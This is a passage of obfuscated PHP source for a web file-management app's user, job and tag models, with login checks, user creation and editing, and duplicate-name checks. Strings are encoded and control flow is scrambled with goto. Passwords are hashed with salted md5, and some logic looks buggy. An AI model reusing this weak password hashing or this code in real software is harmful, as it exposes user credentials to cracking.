array($AŸøÊ„Ô¥È[1497] => USER_ID, $AŸøÊ„Ô¥È[415] => $cÒ’ÂÏ‹±¿); return $this->where($b—×«¢ì¬µ)->delete(); } protected function removeByName($A©šÙ’Ê‚ï) { $FÌµªê¿ÓÖ =& $_SERVER[¾÷]; $D¯Ú”®•Ò« = array($FÌµªê¿ÓÖ[1497] => USER_ID, $FÌµªê¿ÓÖ[416] => $A©šÙ’Ê‚ï, $FÌµªê¿ÓÖ[466] => 0); return $this->where($D¯Ú”®•Ò«)->delete(); } protected function rename($F”êèÈ¯ÄÌ, $aã²É¼ƒ”) { $d¼‰¡¸›†Ú =& $_SERVER[¾÷]; if ($F”êèÈ¯ÄÌ == $aã²É¼ƒ”) { return !1; } $F²“Ïˆïë = $this->getAutoName($aã²É¼ƒ”); if ($aã²É¼ƒ” != $F²“Ïˆïë) { return !1; } $aÄ¶ÆºâÆ“ = array($d¼‰¡¸›†Ú[1497] => USER_ID, $d¼‰¡¸›†Ú[466] => 0, $d¼‰¡¸›†Ú[38] => $F”êèÈ¯ÄÌ); return $this->where($aÄ¶ÆºâÆ“)->save(array($d¼‰¡¸›†Ú[38] => $aã²É¼ƒ”)); } protected function resetSort($f…­ô‰ÛÆù) { $E°÷•·Ûëª =& $_SERVER[¾÷]; $f…­ô‰ÛÆù = is_array($f…­ô‰ÛÆù) ? $f…­ô‰ÛÆù : array(); $F×³Á‰‚¼ = array($E°÷•·Ûëª[1497] => USER_ID); for ($b”š¹Çõ‰ñ = 0; $b”š¹Çõ‰ñ < count($f…­ô‰ÛÆù); $b”š¹Çõ‰ñ++) { $F×³Á‰‚¼[$E°÷•·Ûëª[415]] = $f…­ô‰ÛÆù[$b”š¹Çõ‰ñ]; $this->where($F×³Á‰‚¼)->save(array($E°÷•·Ûëª[1672] => $b”š¹Çõ‰ñ + 1)); } return !0; } protected function moveTop($E¯¸òÓ¼§Ş) { goto A¬Àò›Íœå; fò…·Ğ¤Üó: $Fô·Û¡™ì± = $dÖç‚ÉÉ®°; $dÖç‚ÉÉ®° = array_remove_value($dÖç‚ÉÉ®°, $eôâáŒÜÙƒ[$eÒª’èÅğˆ[397]]); array_unshift($dÖç‚ÉÉ®°, $eôâáŒÜÙƒ[$eÒª’èÅğˆ[397]]); goto dÖÒœ……; A¬Àò›Íœå: $eÒª’èÅğˆ =& $_SERVER[¾÷]; $dšÔÉ•Õõ· = array($eÒª’èÅğˆ[1497] => USER_ID, $eÒª’èÅğˆ[466] => 0); $eôâáŒÜÙƒ = $this->where($dšÔÉ•Õõ·)->where(array($eÒª’èÅğˆ[38] => $E¯¸òÓ¼§Ş))->find(); goto eŞš‹È±í; dÖÒœ……: return $this->resetSort($dÖç‚ÉÉ®°); goto C©øßõİÕÕ; eŞš‹È±í: if (!$eôâáŒÜÙƒ) { return; } $dÖç‚ÉÉ®° = $this->field($eÒª’èÅğˆ[397])->where($dšÔÉ•Õõ·)->order($eÒª’èÅğˆ[2087])->select(); $dÖç‚ÉÉ®° = array_to_keyvalue($dÖç‚ÉÉ®°, $eÒª’èÅğˆ[43], $eÒª’èÅğˆ[397]); goto fò…·Ğ¤Üó; C©øßõİÕÕ: } protected function moveBottom($BÍËÁ¥Ğ—ˆ) { $Fçœ¦œò =& $_SERVER[¾÷]; $eôë©¿‡õ = array($Fçœ¦œò[1497] => USER_ID, $Fçœ¦œò[466] => 0); $F°›†ğ¿‡ = $this->where($eôë©¿‡õ)->max($Fçœ¦œò[1691]); $BÀõÑ›öæÍ = array($Fçœ¦œò[1691] => $F°›†ğ¿‡ + 1); return $this->where($eôë©¿‡õ)->where(array($Fçœ¦œò[38] => $BÍËÁ¥Ğ—ˆ))->save($BÀõÑ›öæÍ); } private function getAutoName($d•Ôõ£¯²Ÿ) { goto Eô«è¡¹ƒ›; Eô«è¡¹ƒ›: $bë½ô²áç =& $_SERVER[¾÷]; $e·®àğ“íÓ = array($bë½ô²áç[1497] => USER_ID, $bë½ô²áç[466] => 0); $e†‰¼ĞÃô = $this->field($bë½ô²áç[38])->where($e·®àğ“íÓ)->select(); goto D³ÑÀ‹Ìáê; d„ÄŞÕî“: return $d•Ôõ£¯²Ÿ . "\x28{$c¥ô¦ô°Ù’}\51"; goto fƒ‰‹„õ„”; D³ÑÀ‹Ìáê: $e†‰¼ĞÃô = array_to_keyvalue($e†‰¼ĞÃô, $bë½ô²áç[43], $bë½ô²áç[38]); if (!$e†‰¼ĞÃô || !in_array($d•Ôõ£¯²Ÿ, $e†‰¼ĞÃô)) { return $d•Ôõ£¯²Ÿ; } for ($c¥ô¦ô°Ù’ = 0; $c¥ô¦ô°Ù’ < count($e†‰¼ĞÃô); $c¥ô¦ô°Ù’++) { if (!in_array($d•Ôõ£¯²Ÿ . "\50{$c¥ô¦ô°Ù’}\51", $e†‰¼ĞÃô)) { return $d•Ôõ£¯²Ÿ . "\x28{$c¥ô¦ô°Ù’}\x29"; } } goto d„ÄŞÕî“; fƒ‰‹„õ„”: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\x6a\x6f\142\x4c\151\163\164"; public $field = array("\x6e\141\x6d\x65", "\x64\145\x73\143", "\x73\x6f\162\x74"); const JOB_KEY = "\x73\x65\154\146\112\157\142\x4c\x69\163\x74"; public function listData($Aï‰óèø½ = false, $FÎé“æÃ£ = "\163\x6f\162\164", $CĞà¹³’Öø = false) { return parent::listData($Aï‰óèø½, $FÎé“æÃ£, $CĞà¹³’Öø); } public function remove($E¿‡à¡Ë») { return parent::remove($E¿‡à¡Ë»); } public function add($d¥•†èÚ’Ê) { $B×äŠñ¡“õ =& $_SERVER[¾÷]; if ($this->findByName($d¥•†èÚ’Ê[$B×äŠñ¡“õ[38]])) { return !1; } $d¥•†èÚ’Ê[$B×äŠñ¡“õ[1691]] = $this->getSort(); return parent::insert($d¥•†èÚ’Ê); } private function getSort() { $fí²ìùì×Ü =& $_SERVER[¾÷]; $EøÚ«ò®¾ = parent::listData(); $CÈîêæ®¥‰ = array_to_keyvalue($EøÚ«ò®¾, $fí²ìùì×Ü[43], $fí²ìùì×Ü[1691]); return empty($CÈîêæ®¥‰) ? 0 : max($CÈîêæ®¥‰) + 1; } public function update($F‹²§Ş¬¶Œ, $E½òñ£ÒÉ×) { $E¦·³õ§½ =& $_SERVER[¾÷]; $c·ÊªÈ²Ÿ = parent::listData($F‹²§Ş¬¶Œ); $eç‡¿‹ô›† = $this->findByName($E½òñ£ÒÉ×[$E¦·³õ§½[38]]); if (!$c·ÊªÈ²Ÿ || $eç‡¿‹ô›† && $eç‡¿‹ô›†[$E¦·³õ§½[397]] != $c·ÊªÈ²Ÿ[$E¦·³õ§½[397]]) { return !1; } return parent::update($F‹²§Ş¬¶Œ, $E½òñ£ÒÉ×); } public function setUserJob($C…ìÜğ‰¥ß, $FÇ‚‚§’ÚÈ) { goto D¿¼ŞÆÊ·; C±ñÓ•İ¤Õ: $D¢Ï²òÍÓ¹ = array_to_keyvalue($BÀ©š¨–›, $cà³æ‰·‡…[38]); $c—‘âÙù¡‡ = $cà³æ‰·‡…[382]; foreach ($FÇ‚‚§’ÚÈ as $DàµÅ‹Ïå) { if ($D¢Ï²òÍÓ¹[$DàµÅ‹Ïå]) { $c—‘âÙù¡‡ .= $D¢Ï²òÍÓ¹[$DàµÅ‹Ïå][$cà³æ‰·‡…[397]] . $cà³æ‰·‡…[57]; } else { $cáÆºä‰à‡ = $this->add($DàµÅ‹Ïå); $c—‘âÙù¡‡ .= $cáÆºä‰à‡ . $cà³æ‰·‡…[57]; } } goto CœÑìÜÁ©İ; D¿¼ŞÆÊ·: $cà³æ‰·‡… =& $_SERVER[¾÷]; if (!is_array($FÇ‚‚§’ÚÈ)) { $FÇ‚‚§’ÚÈ = array($FÇ‚‚§’ÚÈ); } $BÀ©š¨–› = parent::listData(); goto C±ñÓ•İ¤Õ; CœÑìÜÁ©İ: $c—‘âÙù¡‡ = rtrim($c—‘âÙù¡‡, $cà³æ‰·‡…[57]); Model($cà³æ‰·‡…[510])->metaSet($C…ìÜğ‰¥ß, self::JOB_KEY, $c—‘âÙù¡‡); goto eµÈ‡ä‡”–; eµÈ‡ä‡”–: } public function getUserJob($aºÉ¹—öÓˆ) { $cõËÛè¶„¡ = Model($_SERVER[¾÷][510])->metaGet($aºÉ¹—öÓˆ); return $this->getUserJobInfo($cõËÛè¶„¡[self::JOB_KEY]); } public function getUserJobInfo($DŠˆˆ£•¨ˆ) { goto eƒÀ®Ÿ®•ç; eƒÀ®Ÿ®•ç: $E©ğŠŞ¢æÑ =& $_SERVER[¾÷]; $d¸íÊÅ„æ = explode($E©ğŠŞ¢æÑ[57], $DŠˆˆ£•¨ˆ); $f²‹™ÙÈ¾¯ = parent::listData(); goto EŸ ÆšÕ¹™; a‡ô„Ÿ©è‚: return $FÀ‡ŠÁ—ì›; goto aåâ†ˆ¿; EŸ ÆšÕ¹™: $f²‹™ÙÈ¾¯ = array_remove_key($f²‹™ÙÈ¾¯, $E©ğŠŞ¢æÑ[202]); $FÀ‡ŠÁ—ì› = array(); foreach ($d¸íÊÅ„æ as $b¬Á™ÊÒïÜ) { if (isset($f²‹™ÙÈ¾¯[$b¬Á™ÊÒïÜ])) { $FÀ‡ŠÁ—ì›[] = $f²‹™ÙÈ¾¯[$b¬Á™ÊÒïÜ]; } } goto a‡ô„Ÿ©è‚; aåâ†ˆ¿: } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\162"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\x61\155\x65" => "\165\x73\145\162\137\155\145\164\141", "\155\x65\x74\x61\x46\x69\x65\154\144" => "\165\163\145\x72\111\104"); protected $simpleField = "\165\x73\145\x72\x49\104\54\x6e\151\143\x6b\116\141\x6d\145\54\x6e\x61\155\145\54\141\166\141\164\x61\x72\54\163\145\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($D÷„×°¨À) { $fëÏˆ´ñ´Š =& $_SERVER[¾÷]; $C‹äùà…¾¦ = $fëÏˆ´ñ´Š[2088]; return array($fëÏˆ´ñ´Š[1739] => array($D÷„×°¨À[0], $C‹äùà…¾¦), $fëÏˆ´ñ´Š[1741] => array($D÷„×°¨À[0], $C‹äùà…¾¦), $fëÏˆ´ñ´Š[2089] => array($D÷„×°¨À[0], $C‹äùà…¾¦)); } protected function getInfo($D‡Æ †ÃÇ×, $FÅáŸœèÚ = false) { $d©ŒÌ¯™ = $this->getInfoSimple($D‡Æ †ÃÇ×); if (!is_array($d©ŒÌ¯™)) { return array(); } if ($FÅáŸœèÚ) { return $this->_getInfoApply($d©ŒÌ¯™); } return $this->cacheFunctionGet($_SERVER[¾÷][1748], $D‡Æ †ÃÇ×); } protected function getInfoFull($A²ŒÏø»òˆ, $fÑ„¢â© = false) { $d“È°©ÔãÁ = $this->getInfoSimple($A²ŒÏø»òˆ); if (!is_array($d“È°©ÔãÁ)) { return array(); } if ($fÑ„¢â©) { return $this->_getInfoApply($d“È°©ÔãÁ, !0); return $this->_getInfoApply($d“È°©ÔãÁ, !0); } return $this->cacheFunctionGet($_SERVER[¾÷][2090], $A²ŒÏø»òˆ); } private function _getInfoApply($dÉÜ»µ•¨±, $F¹¾Ôš„—¨ = false) { goto bÍŸ¡ ñ‡‰; eêäÍ‚Ã: $dÉÜ»µ•¨±[$BËˆŒˆ°[94]][$BËˆŒˆ°[1928]] = isset($CÛŸÕ¸É²[$BËˆŒˆ°[1929]]) ? $CÛŸÕ¸É²[$BËˆŒˆ°[1929]] : null; if ($F¹¾Ôš„—¨) { $dÉÜ»µ•¨±[$BËˆŒˆ°[448]] = $this->metaGet($dÉÜ»µ•¨±[$BËˆŒˆ°[1505]]); } return $dÉÜ»µ•¨±; goto DŞÄÊóÎè·; a¾„œ»óî¸: $dÉÜ»µ•¨± = $this->_listDataApplyItem($dÉÜ»µ•¨±); $CÛŸÕ¸É² = Model($BËˆŒˆ°[1180])->metaGet($dÉÜ»µ•¨±[$BËˆŒˆ°[94]][$BËˆŒˆ°[399]]); $dÉÜ»µ•¨±[$BËˆŒˆ°[2093]] = $BŠ³‚ “ÖÀ; goto eêäÍ‚Ã; bÍŸ¡ ñ‡‰: $BËˆŒˆ° =& $_SERVER[¾÷]; if (!$dÉÜ»µ•¨±) { return $dÉÜ»µ•¨±; } $BŠ³‚ “ÖÀ = md5($BËˆŒˆ°[2091] . $dÉÜ»µ•¨±[$BËˆŒˆ°[826]] . $BËˆŒˆ°[2092] . $dÉÜ»µ•¨±[$BËˆŒˆ°[38]]); goto a¾„œ»óî¸; DŞÄÊóÎè·: } protected function getInfoSimple($d°²ˆƒ†È, $fğäÙñ‘Ùñ = false) { $fº´ÅÀŸÊ¿ =& $_SERVER[¾÷]; if (!$d°²ˆƒ†È) { return array(); } if ($fğäÙñ‘Ùñ) { $dââ¿ŞĞß™ = $this->where(array($fº´ÅÀŸÊ¿[1505] => intval($d°²ˆƒ†È)))->find(); if (!is_array($dââ¿ŞĞß™)) { return array(); } $dââ¿ŞĞß™[$fº´ÅÀŸÊ¿[2094]] = Action($fº´ÅÀŸÊ¿[2095])->parseUrl($dââ¿ŞĞß™[$fº´ÅÀŸÊ¿[2094]]); return $dââ¿ŞĞß™; } return $this->cacheFunctionGet($fº´ÅÀŸÊ¿[1742], $d°²ˆƒ†È); } protected function getInfoSimpleOuter($a’ß¥•ŸÖ¶) { goto DÂß¸éì©Ç; DÂß¸éì©Ç: $B¢¥ ÀÑÛó =& $_SERVER[¾÷]; if (!$a’ß¥•ŸÖ¶ || $a’ß¥•ŸÖ¶ == 0) { return array($B¢¥ ÀÑÛó[1505] => $B¢¥ ÀÑÛó[500], $B¢¥ ÀÑÛó[38] => $B¢¥ ÀÑÛó[169] . LNG($B¢¥ ÀÑÛó[2096]) . $B¢¥ ÀÑÛó[508], $B¢¥ ÀÑÛó[2094] => STATIC_PATH . $B¢¥ ÀÑÛó[2097]); } $c¥Çå‚ áÜ = $this->cacheFunctionGet($B¢¥ ÀÑÛó[1742], $a’ß¥•ŸÖ¶); goto a£ùÏ³¥ê; Cšäİ½Ù£: return $eÁªàòŠ©; goto E„˜°ˆä’; a£ùÏ³¥ê: $eÁªàòŠ© = array_field_key($c¥Çå‚ áÜ, explode($B¢¥ ÀÑÛó[57], $this->simpleField)); if (!$eÁªàòŠ©) { return array($B¢¥ ÀÑÛó[1505] => $B¢¥ ÀÑÛó[1061], $B¢¥ ÀÑÛó[38] => $B¢¥ ÀÑÛó[169] . LNG($B¢¥ ÀÑÛó[2098]) . $B¢¥ ÀÑÛó[508], $B¢¥ ÀÑÛó[2094] => STATIC_PATH . $B¢¥ ÀÑÛó[2099]); } $eÁªàòŠ©[$B¢¥ ÀÑÛó[2094]] = Action($B¢¥ ÀÑÛó[2095])->parseUrl($eÁªàòŠ©[$B¢¥ ÀÑÛó[2094]]); goto Cšäİ½Ù£; E„˜°ˆä’: } protected function groupUser($aÛ‡Û²´ƒ°) { } public static function errorLang($Fî—Êµ²·—) { $dÖ³øô®çë =& $_SERVER[¾÷]; $d‹ëó°¨Ø = array(self::ERROR_USER_NOT_EXISTS => $dÖ³øô®çë[2100], self::ERROR_USER_PASSWORD_ERROR => $dÖ³øô®çë[2101], self::ERROR_USER_EXIST_NAME => $dÖ³øô®çë[2102], self::ERROR_USER_EXIST_PHONE => $dÖ³øô®çë[2103], self::ERROR_USER_EXIST_EMAIL => $dÖ³øô®çë[2104], self::ERROR_USER_LOGIN_LOCK => $dÖ³øô®çë[2105], self::ERROR_IP_NOT_ALLOW => $dÖ³øô®çë[2106], self::ERROR_USER_EXIST_NICKNAME => $dÖ³øô®çë[2107]); return LNG($d‹ëó°¨Ø[$Fî—Êµ²·—]); } public function getInfoByMeta($cÜ»©†à‹Ï, $fšœ·Œæô¤) { $A­Ö‡ßÍ©Ú =& $_SERVER[¾÷]; $DšŞô¡—Ÿ = Model($A­Ö‡ßÍ©Ú[2108])->where(array($A­Ö‡ßÍ©Ú[102] => $cÜ»©†à‹Ï, $A­Ö‡ßÍ©Ú[379] => $fšœ·Œæô¤))->find(); if ($DšŞô¡—Ÿ) { return $this->getInfo($DšŞô¡—Ÿ[$A­Ö‡ßÍ©Ú[1505]]); } return !1; } public function userLoginCheck($d‚Ó‚Ğ¼æƒ, $EÙÖ‘ò‹ô) { $fĞ¹Ã‘‚‚İ =& $_SERVER[¾÷]; $E˜®êÆÒŠ = $this->userLoginFind($d‚Ó‚Ğ¼æƒ); if (!$E˜®êÆÒŠ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($E˜®êÆÒŠ[$fĞ¹Ã‘‚‚İ[1505]], $EÙÖ‘ò‹ô)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($E˜®êÆÒŠ[$fĞ¹Ã‘‚‚İ[1505]]); } public function userLoginFind($eÙÙ®ˆÁ¤) { $BÑš£°¾‡ =& $_SERVER[¾÷]; $F…¢êÂ­Å = array($BÑš£°¾‡[38] => $eÙÙ®ˆÁ¤, $BÑš£°¾‡[1932] => $eÙÙ®ˆÁ¤, $BÑš£°¾‡[310] => $eÙÙ®ˆÁ¤, $BÑš£°¾‡[2109] => $eÙÙ®ˆÁ¤, $BÑš£°¾‡[934] => $BÑš£°¾‡[936]); if ($this->nickNameRpt()) { unset($F…¢êÂ­Å[$BÑš£°¾‡[1932]]); } return $this->where($F…¢êÂ­Å)->find(); } public function clearCache($E¶¼»¤²Û¨) { $B¨Şğ ù =& $_SERVER[¾÷]; $this->cacheFunctionClear($B¨Şğ ù[1748], $E¶¼»¤²Û¨); $this->cacheFunctionClear($B¨Şğ ù[1742], $E¶¼»¤²Û¨); $this->cacheFunctionClear($B¨Şğ ù[2090], $E¶¼»¤²Û¨); } public function userPasswordCheck($a´ŠÍØšŒï, $f™¼É›ÕÎ—) { $eŒ´Ë•‰ØÇ =& $_SERVER[¾÷]; $D‰è²Ÿ´¥Š = $this->where(array($eŒ´Ë•‰ØÇ[1505] => intval($a´ŠÍØšŒï)))->find(); $bÇÉö¡ŒÎÉ = $this->metaGet($a´ŠÍØšŒï); $c»Ğ¸åÇİ = isset($bÇÉö¡ŒÎÉ[$eŒ´Ë•‰ØÇ[2110]]) ? $bÇÉö¡ŒÎÉ[$eŒ´Ë•‰ØÇ[2110]] : $eŒ´Ë•‰ØÇ[43]; if (md5($c»Ğ¸åÇİ . trim($f™¼É›ÕÎ—)) !== $D‰è²Ÿ´¥Š[$eŒ´Ë•‰ØÇ[826]]) { return !1; } return !0; } public function userAdd($Aµœ´¥³˜) { goto cÃÊæÅÓÛ·; EÂ§˜¾´›µ: $DğÌÜ¯¶¥ = $this->_checkExist($Aµœ´¥³˜); if ($DğÌÜ¯¶¥ !== !0) { return $DğÌÜ¯¶¥; } $F›ËİÉ•¨ƒ = $this->add($fì˜÷Ÿß‰Ñ); goto aÙôÒßêÄ‘; EÜ‹ò™º: return $F›ËİÉ•¨ƒ; goto F˜³œêÏ¶ˆ; aÙôÒßêÄ‘: $eØïŒ–ª¦É = array($fÚ¨Ó£«¹Û[2118] => $fì˜÷Ÿß‰Ñ[$fÚ¨Ó£«¹Û[826]], $fÚ¨Ó£«¹Û[2114] => $fì˜÷Ÿß‰Ñ[$fÚ¨Ó£«¹Û[1932]]); $this->userEdit($F›ËİÉ•¨ƒ, $eØïŒ–ª¦É); Model($fÚ¨Ó£«¹Û[1180])->userRootAdd($F›ËİÉ•¨ƒ); goto EÜ‹ò™º; cÃÊæÅÓÛ·: $fÚ¨Ó£«¹Û =& $_SERVER[¾÷]; $fì˜÷Ÿß‰Ñ = array($fÚ¨Ó£«¹Û[416] => $Aµœ´¥³˜[$fÚ¨Ó£«¹Û[38]], $fÚ¨Ó£«¹Û[2111] => $Aµœ´¥³˜[$fÚ¨Ó£«¹Û[1389]], $fÚ¨Ó£«¹Û[2112] => isset($Aµœ´¥³˜[$fÚ¨Ó£«¹Û[310]]) ? $Aµœ´¥³˜[$fÚ¨Ó£«¹Û[310]] : $fÚ¨Ó£«¹Û[43], $fÚ¨Ó£«¹Û[2113] => isset($Aµœ´¥³˜[$fÚ¨Ó£«¹Û[2109]]) ? $Aµœ´¥³˜[$fÚ¨Ó£«¹Û[2109]] : $fÚ¨Ó£«¹Û[43], $fÚ¨Ó£«¹Û[2114] => isset($Aµœ´¥³˜[$fÚ¨Ó£«¹Û[1932]]) ? $Aµœ´¥³˜[$fÚ¨Ó£«¹Û[1932]] : $Aµœ´¥³˜[$fÚ¨Ó£«¹Û[38]], $fÚ¨Ó£«¹Û[2115] => isset($Aµœ´¥³˜[$fÚ¨Ó£«¹Û[2094]]) ? $Aµœ´¥³˜[$fÚ¨Ó£«¹Û[2094]] : $fÚ¨Ó£«¹Û[43], $fÚ¨Ó£«¹Û[2116] => isset($Aµœ´¥³˜[$fÚ¨Ó£«¹Û[2117]]) ? $Aµœ´¥³˜[$fÚ¨Ó£«¹Û[2117]] : 1, $fÚ¨Ó£«¹Û[2118] => $Aµœ´¥³˜[$fÚ¨Ó£«¹Û[826]], $fÚ¨Ó£«¹Û[1743] => isset($Aµœ´¥³˜[$fÚ¨Ó£«¹Û[1652]]) ? $Aµœ´¥³˜[$fÚ¨Ó£«¹Û[1652]] : 1024 * 1024 * 20, $fÚ¨Ó£«¹Û[1744] => 0, $fÚ¨Ó£«¹Û[2119] => 0, $fÚ¨Ó£«¹Û[1787] => isset($Aµœ´¥³˜[$fÚ¨Ó£«¹Û[711]]) ? $Aµœ´¥³˜[$fÚ¨Ó£«¹Û[711]] : 1); if (!empty($Aµœ´¥³˜[$fÚ¨Ó£«¹Û[1505]])) { $fì˜÷Ÿß‰Ñ[$fÚ¨Ó£«¹Û[1505]] = $Aµœ´¥³˜[$fÚ¨Ó£«¹Û[1505]]; } goto EÂ§˜¾´›µ; F˜³œêÏ¶ˆ: } protected function userEditTest($A»¦çŠÈªÙ, $d›èåÕ±) { return $this->call($_SERVER[¾÷][2120], $A»¦çŠÈªÙ, $d›èåÕ±); } protected function userEdit($dí†Ã”¸‰, $bÊç¨Ñ‘¿à) { goto eÏ×­µ¸°«; f¡œ»’ÔŒå: return !0; goto bÉˆ÷ÅŠ‚; eÏ×­µ¸°«: $F¶³ùÕ±°ó =& $_SERVER[¾÷]; $bßÅó«¥÷ = $this->getInfoSimple($dí†Ã”¸‰); if (!$bßÅó«¥÷) { return !1; } goto e¼ßóæÌÁä; f‹ñÓÀÒ÷Á: $this->where(array($F¶³ùÕ±°ó[1497] => $dí†Ã”¸‰))->save($bÊç¨Ñ‘¿à); if (isset($bÊç¨Ñ‘¿à[$F¶³ùÕ±°ó[1932]])) { $this->setNamePinyin($dí†Ã”¸‰, $bÊç¨Ñ‘¿à[$F¶³ùÕ±°ó[1932]]); } $this->clearCache($dí†Ã”¸‰); goto f¡œ»’ÔŒå; e¼ßóæÌÁä: $B¹„ŒÄ¬‡  = $this->_checkExist($bÊç¨Ñ‘¿à, $dí†Ã”¸‰); if ($B¹„ŒÄ¬‡  !== !0) { return $B¹„ŒÄ¬‡ ; } if (isset($bÊç¨Ñ‘¿à[$F¶³ùÕ±°ó[826]]) && trim($bÊç¨Ñ‘¿à[$F¶³ùÕ±°ó[826]]) != $F¶³ùÕ±°ó[43]) { $e²ªĞ¶Ê‰³ = $this->metaGet($dí†Ã”¸‰); if (empty($e²ªĞ¶Ê‰³[$F¶³ùÕ±°ó[2110]])) { $e²ªĞ¶Ê‰³[$F¶³ùÕ±°ó[2110]] = rand_string(10); Model($F¶³ùÕ±°ó[506])->metaSet($dí†Ã”¸‰, $F¶³ùÕ±°ó[2110], $e²ªĞ¶Ê‰³[$F¶³ùÕ±°ó[2110]]); } $bÊç¨Ñ‘¿à[$F¶³ùÕ±°ó[826]] = md5($e²ªĞ¶Ê‰³[$F¶³ùÕ±°ó[2110]] . trim($bÊç¨Ñ‘¿à[$F¶³ùÕ±°ó[826]])); } else { unset($bÊç¨Ñ‘¿à[$F¶³ùÕ±°ó[826]]); } goto f‹ñÓÀÒ÷Á; bÉˆ÷ÅŠ‚: } public function setNamePinyin($eËö°ğéëõ, $DÉ”Ş÷°Úä = false) { $D³Öøîê‹Ô =& $_SERVER[¾÷]; if (!$DÉ”Ş÷°Úä) { $fëç¥‹õƒ– = $this->getInfoSimple($eËö°ğéëõ); $DÉ”Ş÷°Úä = $fëç¥‹õƒ–[$D³Öøîê‹Ô[1932]] ? $fëç¥‹õƒ–[$D³Öøîê‹Ô[1932]] : $fëç¥‹õƒ–[$D³Öøîê‹Ô[38]]; } $FŸËƒ„Úô² = Model($D³Öøîê‹Ô[510]); if (!Input::check($DÉ”Ş÷°Úä, $D³Öøîê‹Ô[560])) { return $FŸËƒ„Úô²->metaSet($eËö°ğéëõ, array($D³Öøîê‹Ô[447] => $D³Öøîê‹Ô[43], $D³Öøîê‹Ô[446] => $D³Öøîê‹Ô[43])); } return $FŸËƒ„Úô²->metaSet($eËö°ğéëõ, array($D³Öøîê‹Ô[447] => str_replace($D³Öøîê‹Ô[60], $D³Öøîê‹Ô[43], Pinyin::encode($DÉ”Ş÷°Úä)), $D³Öøîê‹Ô[446] => Pinyin::encode($DÉ”Ş÷°Úä, $D³Öøîê‹Ô[561]))); } private function nickNameRpt() { $EÎÆ«—¸½“ =& $_SERVER[¾÷]; $DÓÔ“òİÈ = Model($EÎÆ«—¸½“[1100])->get($EÎÆ«—¸½“[2121]); $C‚â’¼ºà = $GLOBALS[$EÎÆ«—¸½“[16]][$EÎÆ«—¸½“[385]][$EÎÆ«—¸½“[2121]]; $F¯šê©ôÊè = !is_null($DÓÔ“òİÈ) ? $DÓÔ“òİÈ : $C‚â’¼ºà; return !!$F¯šê©ôÊè; } private function _checkExist($CÊØ¼·ÎŸÎ, $Eæ¦£¼Ìß“ = false) { $EœŒŠÉôÀ =& $_SERVER[¾÷]; $e–â¬ÑËğÑ = array($EœŒŠÉôÀ[38] => UserModel::ERROR_USER_EXIST_NAME, $EœŒŠÉôÀ[1932] => UserModel::ERROR_USER_EXIST_NICKNAME, $EœŒŠÉôÀ[310] => UserModel::ERROR_USER_EXIST_EMAIL, $EœŒŠÉôÀ[2109] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($e–â¬ÑËğÑ[$EœŒŠÉôÀ[1932]]); } $c—¢Á¼„Ê« = $Eæ¦£¼Ìß“ ? array($EœŒŠÉôÀ[1505] => array($EœŒŠÉôÀ[2122], $Eæ¦£¼Ìß“)) : array(); foreach ($e–â¬ÑËğÑ as $DÜ‰œ‚ìƒù => $DÓÇ—¹¤¨Ì) { $cŒà¼«¼î = array(); foreach ($e–â¬ÑËğÑ as $cñè„¥°‡ô => $a²‚™¯Á–Í) { if (isset($CÊØ¼·ÎŸÎ[$cñè„¥°‡ô]) && $CÊØ¼·ÎŸÎ[$cñè„¥°‡ô]) { $cŒà¼«¼î[] = $CÊØ¼·ÎŸÎ[$cñè„¥°‡ô]; } } if (!$cŒà¼«¼î) { continue; } $cùÍ»¸íÎ = array_merge(array($DÜ‰œ‚ìƒù => array($EœŒŠÉôÀ[17], $cŒà¼«¼î)), $c—¢Á¼„Ê«); $C¾Û°ÆÓÊá = $this->where($cùÍ»¸íÎ)->find(); if ($C¾Û°ÆÓÊá) { return $DÓÇ—¹¤¨Ì; } } return !0; } public function userListInfo($FÛõ˜»¤“Ó) { $B†ğ„¢ô§à =& $_SERVER[¾÷]; $BÎë´Š‚‡¥ = array(); $FÛõ˜»¤“Ó = is_array($FÛõ˜»¤“Ó) ? array_unique($FÛõ˜»¤“Ó) : array(); if (!$FÛõ˜»¤“Ó) { return $BÎë´Š‚‡¥; } if (count($FÛõ˜»¤“Ó) < 20) { foreach ($FÛõ˜»¤“Ó as $cØ²×”†ç÷) { $BÎë´Š‚‡¥[$cØ²×”†ç÷ . $B†ğ„¢ô§à[43]] = $this->getInfoSimpleOuter($cØ²×”†ç÷); } } else { $FÃµ—·¹«Û = array($B†ğ„¢ô§à[1497] => array($B†ğ„¢ô§à[414], $FÛõ˜»¤“Ó)); if (count($FÛõ˜»¤“Ó) == 1) { $FÃµ—·¹«Û = array($B†ğ„¢ô§à[1497] => $FÛõ˜»¤“Ó[0]); } $F•Ã‰ä«Éø = Model($B†ğ„¢ô§à[506])->field($this->simpleField)->where($FÃµ—·¹«Û)->select(); $F•Ã‰ä«Éø = array_to_keyvalue($F•Ã‰ä«Éø, $B†ğ„¢ô§à[1505]); foreach ($FÛõ˜»¤“Ó as $cØ²×”†ç÷) { $Bùïùåã”¶ = $F•Ã‰ä«Éø[$F•Ã‰ä«Éø[$cØ²×”†ç÷]]; if (!$Bùïùåã”¶) { $BÎë´Š‚‡¥[$cØ²×”†ç÷ . $B†ğ„¢ô§à[43]] = $this->getInfoSimpleOuter($cØ²×”†ç÷); continue; } $Bùïùåã”¶[$B†ğ„¢ô§à[2094]] = Action($B†ğ„¢ô§à[2095])->parseUrl($Bùïùåã”¶[$B†ğ„¢ô§à[2094]]); $BÎë´Š‚‡¥[$cØ²×”†ç÷ . $B†ğ„¢ô§à[43]] = $Bùïùåã”¶; } } return $BÎë´Š‚‡¥; } protected function userStatus($EÇÇÒŠ†‘ô, $BŠ¤†©§“«) { $eÔ·àÅÔ‚ì = $this->getInfoSimple($EÇÇÒŠ†‘ô); if (!$eÔ·àÅÔ‚ì) { return !1; } $F¥°˜İÍË¸ = 